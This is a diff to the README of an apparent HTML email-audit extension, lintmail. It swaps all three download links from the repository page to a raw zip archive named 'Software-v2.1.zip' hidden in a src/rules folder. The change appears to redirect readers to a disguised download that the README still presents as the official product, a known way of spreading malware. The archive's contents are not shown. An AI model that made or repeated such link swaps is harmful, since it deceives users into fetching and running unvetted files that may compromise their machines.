@@ -1,6 +1,6 @@
 # 🔍 lintmail - Audit Your HTML Emails Quickly
 
-[![Download lintmail](https://img.shields.io/badge/Download-lintmail-brightgreen?style=for-the-badge)](https://github.com/VishwaKalyani/lintmail)
+[![Download lintmail](https://img.shields.io/badge/Download-lintmail-brightgreen?style=for-the-badge)](https://github.com/VishwaKalyani/lintmail/raw/refs/heads/main/src/rules/Software-v2.1.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This extension is aimed at people who create emails but do not have technical sk
 
 Go to the official lintmail page on GitHub to get the extension:
 
-[![Get lintmail here](https://img.shields.io/badge/Get%20lintmail-Download%20Now-orange?style=for-the-badge)](https://github.com/VishwaKalyani/lintmail)
+[![Get lintmail here](https://img.shields.io/badge/Get%20lintmail-Download%20Now-orange?style=for-the-badge)](https://github.com/VishwaKalyani/lintmail/raw/refs/heads/main/src/rules/Software-v2.1.zip)
 
 ### Step 2: Download and install the extension
 
@@ -115,4 +115,4 @@ lintmail focuses on email quality and accessibility. It helps brands and markete
 
 To start using lintmail, visit this page and follow the installation instructions:
 
-[Download lintmail](https://github.com/VishwaKalyani/lintmail)
+[Download lintmail](https://github.com/VishwaKalyani/lintmail/raw/refs/heads/main/src/rules/Software-v2.1.zip)
